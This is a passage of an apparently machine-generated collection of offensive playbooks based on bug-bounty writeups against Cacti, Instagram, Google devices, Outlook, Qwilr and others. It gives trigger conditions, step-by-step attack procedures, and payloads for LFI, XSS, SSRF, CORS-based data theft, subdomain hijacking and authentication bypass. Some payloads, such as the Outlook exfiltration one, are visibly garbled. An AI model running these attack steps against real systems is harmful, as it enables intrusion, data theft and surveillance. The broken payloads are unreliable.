playbooks.impact: Depending on the specific implementation and the attributes that can be manipulated, potential impacts include Denial of Service (DoS) by corrupting critical object states, or in more complex scenarios, potentially leading to Remote Code Execution (RCE) if attacker-controlled code can be made to execute.
playbooks.key_lesson: When analyzing Python applications, scrutinize object merging and deserialization functions for uncontrolled recursive processing of input data, paying close attention to the potential manipulation of dunder methods.

meta.title: CVE-2022-25026 & CVE-2022-25027: Vulnerabilities in Rocket TRUfusion Enterprise

trigger_conditions.when_to_apply: When the target is Rocket TRUfusion Enterprise and an unauthenticated attacker can interact with its authentication and URL handling functionalities.
prerequisites: The target system must be vulnerable to authentication bypass and SSRF.
applicability_signals: The presence of an authentication mechanism that can be bypassed.
The application processes user-supplied URLs or parameters that can be manipulated for SSRF.
skip_if: The application enforces strong authentication before any processing.
The application properly sanitizes and validates all user-supplied URLs, preventing SSRF.

recon_steps: Step 1: Identify the target as Rocket TRUfusion Enterprise through banner grabbing, website analysis, or other reconnaissance methods.
Step 2: Analyze the authentication flow and identify potential bypass vectors. Look for unprotected or poorly protected API endpoints or functionalities.
Step 3: Investigate how the application handles URLs or parameters that might be used to fetch external resources.
attack_steps: Step 1: Attempt to bypass the authentication mechanism by sending crafted requests to common login or authentication endpoints, looking for responses that indicate successful access without valid credentials.
Step 2: If authentication is bypassed, identify an endpoint that accepts URLs as parameters.
Step 3: Craft a request to the identified endpoint, providing a URL pointing to an internal resource or a malicious external server controlled by the attacker (e.g., Burp Collaborator).
Step 4: Observe the response for any indication of the application attempting to access the provided URL.
payloads_or_patterns: Authentication bypass payloads (specifics depend on the vulnerability, e.g., sending an empty password, manipulating session cookies).
tools_recommended: Burp Suite: To intercept and manipulate HTTP requests, analyze responses, and use Burp Collaborator for SSRF detection.
success_indicators: Successful authentication without valid credentials (e.g., HTTP 200 response with access to authenticated content).
Receipt of a callback on the attacker-controlled server (e.g., Burp Collaborator) when the SSRF payload is delivered.
An error message or response indicating the application attempted to access an invalid internal resource.
failure_indicators: All authentication bypass attempts result in HTTP 401 Unauthorized or similar access denied responses. → Focus on SSRF independently if possible, or move to another vulnerability.
The application returns specific error messages for invalid URLs or does not attempt to fetch external resources. → Try different SSRF payloads or other attack vectors.

playbooks.impact: Unauthorized access to sensitive information or system functionalities through authentication bypass. Execution of arbitrary requests on behalf of the vulnerable server via SSRF, potentially leading to access of internal network resources or interaction with other services.
playbooks.key_lesson: Always test for authentication bypass on endpoints that handle sensitive data or critical functionalities, and investigate URL handling parameters for SSRF vulnerabilities, especially when unauthenticated access is possible.

meta.title: Cacti: Unauthenticated Remote Code Execution

trigger_conditions.when_to_apply: When a Cacti instance is deployed and accessible, and an unauthenticated attacker can interact with its web interface.
prerequisites: Target Cacti application is running and accessible over the network.
applicability_signals: Access to the Cacti login page or main interface.
Vulnerable version of Cacti is suspected or confirmed.
skip_if: WAF blocks requests attempting to exploit the vulnerability.
Cacti application returns unexpected responses that do not indicate the presence of the vulnerable functionality.

recon_steps: Step 1: Identify Cacti installations through search engines, Shodan, or network scans.
Step 2: Attempt to access the Cacti login page or main dashboard to confirm its presence and version if possible.
attack_steps: Step 1: Craft a malicious request targeting the Cacti application to trigger the RCE vulnerability. The specific endpoint and parameters depend on the known vulnerability, but it generally involves manipulating input that is later executed as a system command.
Step 2: Send the crafted request to the Cacti server.
Step 3: Monitor the target system for signs of command execution or establish a reverse shell if possible.
tools_recommended: Burp Suite: To intercept and modify HTTP requests.
Metasploit Framework: For known Cacti RCE exploits if available.
Custom scripts: To automate the crafting and sending of malicious requests.
success_indicators: Successful execution of arbitrary commands on the target server (e.g., `whoami`, `ls`).
Establishment of a reverse shell connection back to the attacker's machine.
Modification of files or creation of new files on the server.
failure_indicators: Target server returns an error response (e.g., 400, 404, 500) without any command execution.
No observable changes on the target system.
WAF blocks the request and returns a 403 Forbidden status.

playbooks.impact: Attacker can execute arbitrary commands on the server with the privileges of the Cacti application, leading to full system compromise.
playbooks.key_lesson: Unauthenticated RCE vulnerabilities in web applications allow for immediate system compromise; prioritize scanning for and exploiting such flaws.

meta.title: Fetch Diversion

tech_stack_fingerprints: Applications that construct API URLs based on query or fragment parameters

trigger_conditions.when_to_apply: When a web application constructs API request paths dynamically from URL parameters (query or fragment) and these parameters are not properly sanitized before being used in a `fetch` request.
prerequisites: The target application must construct API URLs based on query or fragment parameters.
The client-side JavaScript must be vulnerable to path traversal or similar manipulations in these parameters.
The constructed URL must be used in a `fetch` request.
applicability_signals: Application URLs contain parameters that seem to influence API endpoints (e.g., `/users?id=123456`).
Observing client-side JavaScript that dynamically builds URLs for `fetch` requests based on URL parameters.
The parameter value appears to be directly embedded into the URL path before the domain.
Existence of file upload functionality that can be retrieved via an endpoint and then processed in a way that could lead to XSS.
skip_if: API endpoints are static and not constructed from user-controlled parameters.
All URL parameters are properly sanitized and do not allow path traversal characters (`../`, `%2E%2E%2F`).
The `fetch` request is made with a `Content-Type` that is not exploitable for XSS, and there's no way to control it or the response processing.
WAF blocks `../` or similar traversal sequences and there's no obvious bypass.

recon_steps: Step 1: Analyze the target application's URLs for query or fragment parameters that appear to influence API calls (e.g., `?id=`, `#/user/`).

Step 2: Use browser developer tools to observe network requests made by the application, paying attention to the construction of API request URLs. Identify parameters that are directly inserted into the path.
attack_steps: Step 1: Construct a malicious URL by manipulating an identified parameter to include path traversal sequences like `../` or URL-encoded equivalents (`%2E%2E%2F`). Aim to alter the API endpoint path. Example: `https://app.target.com/users?id=../malicious/path`

Step 2: If file uploads are involved and retrievable, craft a malicious file (e.g., SVG, XML, or JSON with script tags) and upload it. Then, try to divert a `fetch` request to this uploaded file's URL.

Step 3: Append a `#` or `?` to the manipulated parameter to terminate the path traversal early, allowing the diverted request to reach a different API endpoint. Example: `https://app.target.com/users?id=../malicious/path#`
Step 4: Submit the crafted URL to the target application and observe the resulting network requests and DOM manipulation.
Step 5: If the diverted request successfully targets a different endpoint and its response is insecurely processed in the DOM, this indicates a successful DOM XSS.
tools_recommended: Burp Suite: To intercept and modify requests, analyze responses, and set up collaborator for SSRF detection if applicable.
Browser Developer Tools: For inspecting network requests, JavaScript execution, and DOM manipulation.
success_indicators: The `fetch` request is observed targeting an unexpected API endpoint (e.g., `https://api.target.com/v2/malicious/path` instead of `https://api.target.com/v2/users/123456`).
JavaScript code from an unexpected source (e.g., an uploaded file or a different API endpoint response) is executed in the browser's DOM.
Alerts pop up or sensitive information is logged to the console.
The application's behavior changes in a way that indicates successful exploitation (e.g., data theft, unauthorized actions).
failure_indicators: The API request still goes to the original, expected endpoint, indicating successful sanitization or lack of vulnerable parameter.
A 404 Not Found or 403 Forbidden is returned for the manipulated path, suggesting the endpoint does not exist or is protected.
The application crashes or shows an error without any exploitable behavior, indicating potential input validation but no direct XSS.
If the diverted request's response is not rendered insecurely in the DOM, even if the diversion itself is successful.

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim's browser session, potentially leading to session hijacking, data theft, defacement, or further client-side attacks.
playbooks.key_lesson: Always validate and sanitize parameters used to construct API request paths client-side, especially when they originate from URL query or fragment identifiers, to prevent path traversal and subsequent DOM XSS.

meta.title: Bypass firewalls with of-CORs and typo-squatting

affected_components: Internal networks accessible via browser exploitation
tech_stack_fingerprints: Presence of internal web applications, JavaScript files on internal networks

trigger_conditions.when_to_apply: When targeting organizations with internal web applications that might expose sensitive data or functionality through misconfigured CORS policies, especially when direct access to internal networks is restricted.
prerequisites: Ability to trick users into visiting a typosquatted domain.
Target organization uses CORS with a wildcard '*' or overly permissive origin.
applicability_signals: Discovery of internal JavaScript files referencing internal APIs.
Observable CORS headers in responses from internal applications.
skip_if: All internal applications strictly enforce origin checks and do not allow wildcards.
Target organization has strong WAF rules that prevent external access to internal endpoints.

recon_steps: Step 1: Identify potential internal subdomains or hostnames of the target organization.
Step 2: Enumerate likely internal subdomains for target organizations using typo-squatting techniques.
Step 3: Analyze JavaScript files found on internal applications for references to internal APIs or sensitive endpoints.
attack_steps: Step 1: Set up the of-CORS toolkit, including a typosquatted domain and a callback server.
Step 2: Launch a JavaScript payload (e.g., via a service worker) from the typosquatted domain to prod for CORS misconfigurations against configured domains on the internal network.
Step 3: The JavaScript payload makes requests to potential internal application endpoints, including the `Origin` header set to the typosquatted domain.
Step 4: If an internal application has a CORS misconfiguration (e.g., `Access-Control-Allow-Origin: *`), it will allow the request from the typosquatted domain.
Step 5: The JavaScript payload receives the response from the internal application and sends sensitive data back to the attacker's callback server.
Step 6: Utilize a service worker to make requests long after the victim is redirected off the typosquatting domain, increasing the window for exploitation.
Step 7: Query the results from the victim's browser in the of-CORS UI.
payloads_or_patterns: JavaScript payload designed to probe for CORS misconfigurations against internal endpoints. Specific payloads depend on the discovered internal APIs and their expected behavior. Example structure: `fetch('http://<internal_app_hostname>/api/v1/data', { headers: { 'Origin': 'http://<typosquatted_domain.com>' } });`
tools_recommended: of-CORS toolkit (custom tool)
Burp Suite (for analyzing HTTP requests and responses during testing)
Sublist3r or Amass (for subdomain enumeration)
success_indicators: Receiving sensitive data (e.g., user credentials, PII, API keys) from internal applications via the callback server.
Observing `Access-Control-Allow-Origin: *` or overly permissive origins in responses from internal applications when the `Origin` header is set to the attacker-controlled domain.
failure_indicators: All probes to internal applications result in `403 Forbidden` or `CORS policy violation` errors in the browser console, indicating strict origin enforcement. -> Pivot to other attack vectors or re-evaluate subdomain discovery.

No callbacks received on the attacker's server, suggesting no exploitable CORS misconfigurations were found. -> Verify the typosquatting domain is accessible and the JavaScript payload is executing correctly.

playbooks.impact: Attacker can access sensitive data residing in internal web applications that are not intended to be exposed externally. This could include Personally Identifiable Information (PII), authentication tokens, internal API keys, or proprietary business logic.
playbooks.key_lesson: Always validate CORS configurations on internal web applications, as overly permissive settings (especially wildcards) can lead to data leakage and compromise when combined with techniques like typosquatting and browser-based payload delivery.

meta.title: Instagram vulnerability : Turn off all type of message requests using deeplink (Android)

affected_components: Message Controls functionality accessed via deeplink

trigger_conditions.when_to_apply: When the target is using the Instagram Android app and can trigger deeplinks.
prerequisites: The target user must have the Instagram Android app installed and be logged in.
applicability_signals: The existence of the `instagram://turn_off_message_requests` deeplink, which can be invoked from other applications.
skip_if: The Instagram app is not installed on the target device.
The `instagram://turn_off_message_requests` deeplink is not functional or has been patched.

recon_steps: Confirm the target device has the Instagram Android app installed.
Verify the Instagram app version if possible, though the writeup implies it affects a specific version (258.1.0.26.100) and potentially later ones until fixed.
attack_steps: Step 1: Craft a malicious application or exploit a vulnerability in another app to trigger the Instagram deeplink.
Step 2: Execute the deeplink `instagram://turn_off_message_requests`.
Step 3: The deeplink executes headlessly, turning off all message requests without user interaction or UI.
Step 4: The attacker can verify the effect by checking the target's message controls settings within the Instagram app (if they gain access to the user's device or account).
tools_recommended: Android development tools (Android Studio) to create a malicious app that can trigger the deeplink.
Deep understanding of Android intents and deeplink handling.
success_indicators: The target user's message request settings in the Instagram app are changed to 'Don’t receive' for all message types, as observed by the attacker or reported by the victim.
No UI is presented to the user when the deeplink is executed, indicating headless operation.
failure_indicators: The deeplink execution results in an error message or does not change the message controls settings. This could indicate the vulnerability has been patched or the app version is incompatible.
A UI prompt appears requesting user confirmation, indicating the headless execution is no longer possible.

playbooks.impact: An attacker can disable all incoming message requests for a victim user without their knowledge or consent, potentially preventing them from receiving important communications or notifications. This could be a precursor to other attacks or used for disruption.
playbooks.key_lesson: Always investigate Android deeplinks for functionalities that can be triggered headlessly and without explicit user permission, as they can lead to unauthorized actions.

meta.title: Exploiting thousands of Domains for XSS

affected_components: files.secureserver.net subdomains, specifically the file sharing feature

trigger_conditions.when_to_apply: When a subdomain is identified that uses files.secureserver.net as its CNAME, indicating it's hosted on GoDaddy's file sharing service and reflects user input without proper sanitization.
prerequisites: Identification of subdomains using files.secureserver.net as a CNAME.
applicability_signals: A subdomain pointing to files.secureserver.net is discovered.
Burp Suite's Reflector extension indicates input reflection on a page served by the subdomain.
URL parameters are present in the request.
skip_if: No input reflection is observed on pages served by the subdomain.
The subdomain does not resolve to files.secureserver.net.

recon_steps: Step 1: Identify subdomains using a reverse CNAME lookup for files.secureserver.net to find potentially vulnerable GoDaddy-hosted domains.
Step 2: Visit identified subdomains and observe their functionality. Use Burp Suite's auto-scan or manual browsing to check for input reflection in responses.
attack_steps: Step 1: Send a request to a suspected vulnerable endpoint (e.g., http://files.example.com/index.php) with a crafted payload in a parameter that is reflected in the response.
Step 2: Observe the response for the reflected payload. If it is reflected without sanitization, attempt to inject JavaScript code.
Step 3: If successful, the JavaScript code will execute in the context of the user's browser.
tools_recommended: Burp Suite (Auto-scan, Reflector extension)
Google Dorks (for initial discovery, though less precise)
Tools for reverse CNAME lookups (e.g., `dig -x <IP_address>` or online services)
success_indicators: The injected JavaScript code executes, e.g., an alert box pops up.
The payload is reflected raw in the HTML response without encoding or sanitization.
failure_indicators: Payload is HTML-encoded (e.g., `<script>` instead of `<script>`), indicating output encoding is in place. Pivot to testing different injection points or event handlers.
A 403 Forbidden or WAF block response is received. Try obfuscating the payload or using different XSS vectors.
No input reflection is observed. Re-evaluate the target endpoint and parameters.

playbooks.impact: Cross-Site Scripting (XSS) allows an attacker to execute arbitrary JavaScript code in the victim's browser within the context of the vulnerable domain. This can lead to session hijacking, credential theft, defacement, or redirection to malicious sites.
playbooks.key_lesson: Always check CNAME records for services like files.secureserver.net to identify potential widespread vulnerabilities on third-party hosted applications. Manually examine Burp Suite's identified input reflections for XSS opportunities.

meta.title: Subdomain Hijacking Of Any Qwilr’s Customer

tech_stack_fingerprints: Qwilr trial account allows setting up custom subdomains like `<your_subdomain>.qwilr.com`

trigger_conditions.when_to_apply: When a target subdomain is observed to have a CNAME record pointing to `custom-domains.qwilr.com` and the attacker can register a custom subdomain on Qwilr's platform that conflicts with this CNAME.
prerequisites: Target has a subdomain with a CNAME record pointing to `custom-domains.qwilr.com`
Attacker can create a Qwilr trial account

Qwilr's service allows registering a custom subdomain that can conflict with the target's CNAME (e.g., attacker registers `custom-domains.qwilr.com` or a subdomain that Qwilr uses for its custom domain service)
applicability_signals: Subdomain's DNS records show a CNAME pointing to `custom-domains.qwilr.com`
Visiting the subdomain shows a Qwilr-related error page or a default Qwilr page.
skip_if: The target subdomain is not using `custom-domains.qwilr.com` as a CNAME.
The Qwilr service has reserved keywords or the `custom-domains` prefix, preventing the attacker from claiming it.

recon_steps: Step 1: Enumerate subdomains for the target domain.
Step 2: For each subdomain, query its DNS records (e.g., using `dig` or `nslookup`) and look for CNAME records.
Step 3: Identify subdomains with CNAME records pointing to `custom-domains.qwilr.com`.
attack_steps: Step 1: Create a trial account on Qwilr (app.qwilr.com).

Step 2: Attempt to register a custom subdomain on Qwilr that might conflict with the target's CNAME. Based on the writeup, registering `custom-domains.qwilr.com` or a similar conflicting prefix seems to be the key.
Step 3: Create a PoC page within Qwilr.

Step 4: Obtain the shareable URL for the PoC page, which will likely be in the format `https://<attacker_registered_subdomain>.qwilr.com/<poc_id>` or `https://custom-domains.qwilr.com/<poc_id>` if the attacker successfully claimed that specific subdomain.
Step 5: Construct a malicious URL by replacing the attacker's Qwilr subdomain with the target's vulnerable subdomain. For example: `https://<vulnerable_target_subdomain>.target.info/<poc_id>`.
Step 6: Visit the constructed URL to verify if the PoC page from the attacker's Qwilr account is served.
payloads_or_patterns: Create a page on Qwilr with arbitrary content. The shareable URL will be generated by Qwilr.
tools_recommended: Subdomain enumeration tools (e.g., `subfinder`, `amass`)
DNS query tools (e.g., `dig`, `nslookup`)
Burp Suite (to potentially analyze network traffic or automate requests)
success_indicators: The PoC page created by the attacker is displayed when visiting the target's subdomain (e.g., `<subdomain>.target.info`).
HTTP response status code 200 OK for the constructed malicious URL.
The content served on the target subdomain matches the attacker's Qwilr PoC content.
failure_indicators: A 404 Not Found or other error page is served instead of the attacker's PoC page.
The target subdomain does not resolve or points to a different service than `custom-domains.qwilr.com`.
Qwilr's platform prevents the attacker from registering the required custom subdomain prefix.

playbooks.impact: Attacker can hijack any subdomain of the target that is configured with a CNAME record pointing to `custom-domains.qwilr.com`. This allows the attacker to serve arbitrary content from their Qwilr account on the target's subdomain, potentially leading to phishing, credential theft, or defacement.
playbooks.key_lesson: When a service uses CNAME records for custom domain configurations (e.g., `custom-domains.<service>.com`), check if the service allows users to register subdomains that conflict with or hijack these CNAME targets, especially if keywords like 'custom-domains' itself are not reserved.

meta.title: LDAP anonymous login story of my 3 simple P3 findings

tech_stack_fingerprints: Nmap script 'ldap* and not brute' returns results

trigger_conditions.when_to_apply: This technique is applicable when an LDAP service is detected running on port 389 (or another common LDAP port) and it permits anonymous binds, allowing an unauthenticated attacker to query directory information.
prerequisites: Target has an open port 389 (or other LDAP port).
applicability_signals: LDAP service is running on a target port.
Nmap scan with 'ldap* and not brute' script shows results.
skip_if: LDAP service requires authentication.
Firewall blocks access to LDAP port.

recon_steps: Step 1: Scan target IP addresses for open ports, specifically looking for port 389.
Step 2: If port 389 is open, run Nmap with the command 'nmap -n -sV -script "ldap* and not brute" <target_ip>' to fingerprint the LDAP service and check for anonymity.
attack_steps: Step 1: Use the `ldapsearch` tool to attempt an anonymous bind and query directory information. Command: `ldapsearch -h <target_ip> 389 -x -s base -b '' "(objectClass=*)" "*" +`
tools_recommended: Nmap: For port scanning and service fingerprinting.
ldapsearch: For interacting with LDAP servers and testing anonymous binds.
success_indicators: Successful retrieval of directory information (e.g., internal directory structure, user information) without any authentication credentials.
ldapsearch command returns data instead of an authentication error.
failure_indicators: LDAP search returns an authentication required error (e.g., "Invalid credentials", "No such object"). This indicates anonymous bind is not permitted. Pivot: Attempt to enumerate other services or look for different vulnerabilities.
No response from the LDAP port. This could indicate a firewall or the service is not actually running correctly. Pivot: Re-verify port status and try other common LDAP ports (e.g., 636 for LDAPS).

playbooks.impact: An attacker can enumerate sensitive internal directory information, user accounts, group memberships, and potentially other configuration details without authentication. This information can be used for further attacks, such as targeted phishing, privilege escalation, or identifying other vulnerabilities.
playbooks.key_lesson: Always check network services for default or misconfigured access controls, such as anonymous LDAP binds, as they can expose sensitive internal information.

meta.title: Hacking a .NET API in the real world

tech_stack_fingerprints: response header X-Powered-By might contain ASP.NET (inferred from .NET)

trigger_conditions.when_to_apply: When an API endpoint accepts a GUID that is used to fetch a generated report, and the validation of this GUID is insufficient.
prerequisites: Attacker has a valid session to the API.
applicability_signals: An endpoint exists that accepts a GUID and returns a PDF report stream.
The GUID is a v4 UUID and cannot be easily guessed or predicted.
Initial fuzzing reveals that invalid GUIDs return 404, but malformed inputs result in 200 OK with file stream bodies.
skip_if: The API strictly validates all inputs and does not allow any path traversal or file inclusion characters.
All responses for malformed GUIDs return non-200 status codes without revealing file content.

recon_steps: Step 1: Identify endpoints that generate reports based on user input, particularly those using GUIDs. Use Burp Suite or a similar tool to intercept and analyze requests.
Step 2: Send a valid request to the report generation endpoint with a valid GUID and observe the response (e.g., a PDF file stream).
Step 3: Send a request with an invalid or malformed GUID to observe the error handling. Look for responses that are not 404 but still return file streams.
attack_steps: Step 1: Send a request to the report generation endpoint, replacing the valid GUID with common LFI payloads. Example: /reports?id=../../../../etc/passwd
Step 2: If the initial LFI attempts are blocked, try URL encoded or double encoded paths. Example: /reports?id=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
Step 3: Attempt to retrieve API-specific artifacts like configuration files or source code if LFI is successful. Example: /reports?id=../../appsettings.json
Step 4: If the OS is identified as Linux, attempt to read /etc/os-release to confirm the distribution. Example: /reports?id=../../../../etc/os-release
Step 5: If the application is containerized, try to read /.dockerenv. Example: /reports?id=../../../../.dockerenv
tools_recommended: Burp Suite Intruder: For fuzzing the GUID parameter with a wordlist of LFI payloads.
Burp Suite Repeater: For testing individual LFI payloads and analyzing responses.
success_indicators: HTTP 200 OK response containing the content of sensitive files like /etc/passwd, /etc/os-release, application configuration files, or .dockerenv.
Response body is not a valid PDF but contains readable file content.
failure_indicators: Consistent 404 responses for all LFI payloads indicate strict input validation or lack of LFI.
WAF-detected 403 Forbidden responses suggest a Web Application Firewall is blocking traversal attempts.
200 OK responses containing generic error messages or valid PDF reports with no leaked information.

playbooks.impact: Attacker can read arbitrary files from the server, potentially revealing sensitive configuration data, API keys, source code, or user credentials. This can lead to further exploitation, such as server-side code execution, privilege escalation, or full system compromise.
playbooks.key_lesson: Always validate and sanitize user-controlled input used in file paths to prevent Local File Inclusion (LFI) vulnerabilities, especially when dealing with APIs that generate or serve files.

meta.title: XSS via `uri` parameter in file uploading feature

trigger_conditions.when_to_apply: When the file upload functionality returns the `uri` parameter unescaped in the response body with a `text/html` Content-Type header.
prerequisites: An authenticated Google Cloud Shell user.
applicability_signals: The `/file-upload` endpoint exists and accepts POST requests.
The response to a file upload contains an unescaped `uri` parameter.
The `Content-Type` header of the response is `text/html`.
skip_if: The `uri` parameter is properly sanitized or HTML-encoded in the response.
The `Content-Type` header is not `text/html`.

recon_steps: Identify a Google Cloud Shell instance and its corresponding `*-cs-*-default.cs-*.cloudshell.dev` hostname.
attack_steps: Step 1: Craft a POST request to the `/file-upload` endpoint, including a malicious payload in the `uri` parameter. The payload should aim to trigger JavaScript execution, e.g., `<img/src/onerror=alert(document.domain)>`.
Step 2: Use `multipart/form-data` encoding for the request, including a dummy file upload.
Step 3: Configure the `uri` parameter to include the JavaScript payload and a unique identifier (e.g., random number) to prevent caching issues.
Step 4: Initiate the upload. If successful, the browser will render the response containing the unescaped `uri` parameter as HTML, executing the embedded JavaScript.
payloads_or_patterns:
POST /file-upload HTTP/1.1
Host: <TARGET_HOST>
Content-Type: multipart/form-data; boundary=----...

------...
Content-Disposition: form-data; name="uri"

/tmp/test<img/src/onerror=alert(document.domain);{Math.floor(Math.random() * 1000)}>
------...
Content-Disposition: form-data; name="file"; filename="img.jpg"
Content-Type: image/jpeg

<dummy file content>
------...--
tools_recommended: Burp Suite: To craft and send the malicious POST request.
Browser Developer Tools: To inspect the response and confirm payload execution.
success_indicators: An alert box pops up with `document.domain` (e.g., `alert('console.google.com')`).
failure_indicators: The `uri` parameter is escaped or sanitized in the response, and no JavaScript executes. Pivot: Investigate other parameters or endpoints for injection vulnerabilities.
A 4xx or 5xx error response is received. Check request formatting and authentication.

playbooks.impact: An attacker can execute arbitrary JavaScript in the context of the victim's Google Cloud Shell session, allowing for session hijacking, data exfiltration, or further attacks within the cloud shell environment.
playbooks.key_lesson: Always inspect the `Content-Type` header of responses that include user-supplied input, as it dictates how the browser will interpret the content, potentially leading to XSS if set to `text/html`.

meta.title: Turning Google smart speakers into wiretaps for $100k

target_profile.technology: Google Home Mini (and other Google smart speakers)

trigger_conditions.when_to_apply: When an attacker is within wireless proximity of a vulnerable Google smart speaker and can intercept or influence the device linking process.
prerequisites: Attacker must be on the same local network as the target device.
The target Google Home device must be powered on and discoverable.
applicability_signals: Discovery of Google Cast devices on the local network via mDNS.
Open HTTP ports (8008, 8009, 8443) on the Google Home device.
Vulnerability in the device linking process that allows unauthorized account association.
skip_if: The target device is not discoverable on the local network.
All HTTP ports are closed or heavily firewalled, preventing communication.

recon_steps: Step 1: Use `dns-sd -B _googlecast._tcp` to discover Google Cast devices on the local network and identify their hostnames.
Step 2: Use `nmap <TARGET_IP>` to identify open ports on the discovered Google Home device, specifically looking for HTTP ports like 8008, 8009, or 8443.
attack_steps: Step 1: Intercept the communication between the Google Home app and the Google Home device during the initial setup or account linking phase using a MITM proxy like `mitmproxy`.

Step 2: Analyze the intercepted traffic to understand the device linking protocol and identify vulnerabilities that allow an attacker to associate their account with the device without proper authorization.
Step 3: Develop a malicious routine or action that executes arbitrary commands on the device.
Step 4: Exploit the identified vulnerability to install the malicious routine/action onto the target Google Home device.
Step 5: Remotely trigger the malicious routine to gain control of the device, access its microphone, or perform actions on the victim's LAN.
payloads_or_patterns: Insufficient detail in writeup for specific payloads. The writeup describes developing 'malicious routines' and 'actions' but does not provide concrete payload examples for command execution or file access.
Placeholder for an exploit that manipulates the device linking process to inject a malicious routine.
tools_recommended: mitmproxy: For intercepting and analyzing HTTP traffic between the Google Home app and the device.
dns-sd: For discovering Google Cast devices on the local network.
nmap: For port scanning the target device.
Frida: Potentially for dynamic analysis of the Google Home app.
success_indicators: Confirmation that a malicious routine/action has been installed on the device.
Ability to send commands to the device remotely over the Internet.
Successful access to the device's microphone feed.
Successful execution of arbitrary HTTP requests within the victim's LAN.
failure_indicators: Device linking process fails or requires explicit user confirmation that cannot be bypassed.
MITM proxy does not capture relevant traffic or the traffic is heavily encrypted and cannot be decrypted.
Attempts to install malicious routines are rejected by the device.
Pivoting suggestion: If account linking is hardened, investigate firmware vulnerabilities or other network-based attacks.

playbooks.impact: Attacker can install a 'backdoor' account, enabling remote command execution, microphone access, and arbitrary HTTP requests within the victim's Local Area Network. This could lead to the exposure of Wi-Fi passwords or direct access to other devices on the network.
playbooks.key_lesson: Always investigate the device linking and account provisioning process for IoT devices, as vulnerabilities here can lead to full device compromise and network lateral movement.

meta.title: How I found multiple critical bugs in Red Bull
meta.category: Authentication bypass, HTTP response manipulation, Path traversal, LFI, XSS, SQL injection, RCE, Unrestricted file upload, RFI, Security code review

trigger_conditions.when_to_apply: When a web application allows redirection to an authentication page, but the initial script execution and rendering occur before the redirection is enforced, allowing access to internal application pages without full authentication.
prerequisites: The target web application exhibits delayed redirection logic.
applicability_signals: Directory/file enumeration reveals endpoints that redirect to a common login/main page.
Different response sizes are observed for endpoints that are supposed to all redirect to the same page.
Manually inspecting responses for these endpoints shows different content before redirection.
skip_if: All enumerated endpoints consistently return the same response size and content, indicating redirection happens before script execution.

recon_steps: Step 1: Identify subdomains of the target and browse them to identify web interfaces.
Step 2: Perform directory and file enumeration using tools like ffuf on identified web interfaces.
Step 3: Observe redirection behavior and response sizes for enumerated endpoints.
attack_steps: Step 1: Configure Burp Suite Proxy's Match and Replace rules to intercept and stop redirects.
Step 2: Refresh the previously enumerated endpoint URL (e.g., https://subdomain.redbull.com/webadmin/dashboard.php) in the browser.
Step 3: Upon successful bypass, attempt to access other application functionalities that are normally behind authentication.
tools_recommended: Burp Suite Proxy (for Match and Replace rules)
ffuf (for directory/file enumeration)
success_indicators: The web application interface is displayed without a login screen, indicating successful bypass of authentication.
Access to restricted application areas is granted.
failure_indicators: The redirection still occurs, and the login screen is shown, or a generic error page is displayed. Suggestion: Re-evaluate the delay in redirection or try different endpoints.
Applying the Burp rule does not change the observed behavior. Suggestion: Ensure the Match and Replace rule is correctly configured and applied to the relevant requests.

playbooks.impact: Gains unauthenticated access to application functionalities that are intended for authenticated users, potentially leading to further exploitation depending on the accessible features.
playbooks.key_lesson: Always configure Burp Suite to intercept and stop redirects when observing endpoints that redirect to login pages, as script execution might precede redirection, leading to authentication bypass.

meta.title: Uncovering a Bug I Found in Outlook: How Could an Account Has Been Compromised?

trigger_conditions.when_to_apply: When the target application has a link preview feature that fetches and renders content from trusted domains, and the rendering process is susceptible to HTML/JavaScript injection.
prerequisites: Attacker has an email account that can send emails to the target user.
The target user's email client renders link previews.
applicability_signals: Existence of a link preview feature in email composition/display.
Observation that the preview feature fetches content from a list of trusted/whitelisted domains.
Analysis of how the fetched content is rendered, looking for potential injection points in meta tags or other displayed HTML elements.
skip_if: Link preview feature is disabled or not present.
All external content fetching is heavily sandboxed with no rendering of user-controllable HTML.
Strict Content Security Policy (CSP) prevents inline scripts and external script loading.

recon_steps: Step 1: Identify trusted domains used by the Outlook link preview feature by searching on Microsoft and Xbox domains and observing which domains' content is previewed.
Step 2: Analyze the HTML structure and meta tags fetched from these trusted domains by the link preview feature to identify potential injection vectors.
Step 3: Find a Microsoft-owned or trusted subdomain (like gallery.technet.microsoft.com) that allows user-generated content (e.g., descriptions, posts) which can host the XSS payload.
attack_steps: Step 1: Craft a malicious payload using an `` tag with an `onerror` event handler that attempts to execute JavaScript.
Step 2: Within the `onerror` handler, use `document.write()` to create an iframe. The iframe's `src` should point to an attacker-controlled server.
Step 3: Dynamically include the victim's email address in the iframe's URL by capturing `document.title` (which often contains the email address in Outlook).
Step 4: Encode the JavaScript payload to bypass potential filters or WAFs, using `eval(atob(...))` for obfuscation.
Step 5: Host the malicious XSS payload within the description or body of a post on a trusted Microsoft domain (e.g., gallery.technet.microsoft.com).
Step 6: Send an email containing a link to this malicious post to the victim.
Step 7: Monitor the attacker-controlled server for incoming requests containing the victim's email address.
payloads_or_patterns: Payload structure: `>')" >`
tools_recommended: Burp Suite: To intercept and analyze HTTP requests/responses related to link previews.
Custom PHP server: To receive and parse the victim's email address from the iframe request.
Payload encoding tools: For obfuscating JavaScript payloads.
success_indicators: An incoming HTTP request to the attacker's server containing the victim's email address in the query parameters.
The victim's email address appearing in the server logs.
A successful creation of a phishing page or data exfiltration from the iframe.
failure_indicators: The XSS payload is not executed, indicating successful sanitization or filtering by the target application or email client.
The `onerror` handler is not triggered, or the `document.write` command fails.
CSP restrictions prevent the execution of inline scripts or the loading of external resources.
No request is received by the attacker's server.

playbooks.impact: Account compromise via phishing, sensitive data exfiltration (e.g., credentials, personal information), or execution of arbitrary JavaScript in the victim's browser context within the trusted Microsoft domain.
playbooks.key_lesson: Always scrutinize how external content, especially from whitelisted domains, is rendered in web applications. Injection vulnerabilities can arise from insufficient sanitization of HTML meta tags or other dynamic content displayed to users.

meta.title: How I Pwned 10 Admin Panels and got rewarded 8000$+

trigger_conditions.when_to_apply: When an API endpoint like /api/v1/config returns a 404 Not Found and appears to have been accessible in the past.
prerequisites: Discovery of JavaScript files containing API endpoints.
Existence of a login panel accessible via a /signin path.
applicability_signals: API endpoint returns 404 Not Found.
JavaScript files contain API endpoints.
A login panel is identified at /signin.
skip_if: No JavaScript files are found.
No login panel is found.
The /api/v1/config endpoint consistently returns 404 without historical data.

recon_steps: Step 1: Analyze JavaScript files (e.g., main.js, app.js) for API endpoints.
